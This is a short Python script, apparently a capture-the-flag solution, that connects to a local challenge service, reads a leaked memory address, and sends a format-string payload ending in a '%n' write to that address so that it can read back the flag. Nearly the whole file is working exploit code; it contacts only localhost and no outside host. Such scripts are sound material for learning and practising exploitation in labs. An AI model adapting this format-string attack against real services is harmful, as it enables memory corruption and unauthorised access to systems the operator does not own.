#!/usr/bin/env python3

import socket 

def main(): 
    try: 
        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        clientsocket.connect(('127.0.0.1.',18156)) # Connect to ip address and port 
        test=clientsocket.recv(4096).decode() # Read addr 
        
        addrStr = test[-9:-1:1]  # get addr
        print(addrStr)
        
        addrStr1 = "" #stores raw string of hex form
        for i in reversed(range(0,8,2)):
            print(i)
            addrStr1 = addrStr1 + r"\x" + str(addrStr[i:i+2]) 
            print(addrStr1)
        payload = b""
        payload = eval("b\"" + addrStr1 + "\"") #the stupidest method to convert a hex form string into actual hex data
        
        print(type(payload))
        print(payload)
        
        payload = payload + "%016d%016d%014d%n".encode()
        
        print(type(payload))
        print(payload)
        
        clientsocket.sendall(payload+"\n".encode()) # send payload
        print(clientsocket.recv(4096).decode()) # Get uselesss text
        clientsocket.sendall("1234\n".encode()) # send garbage text
        print(clientsocket.recv(4096)) # Receive garbage text agin
        print(clientsocket.recv(4096)) # Get Flag 
        
        clientsocket.close() 
    except socket.error as e: print(str(e))

if __name__ == "__main__": 
    main() 
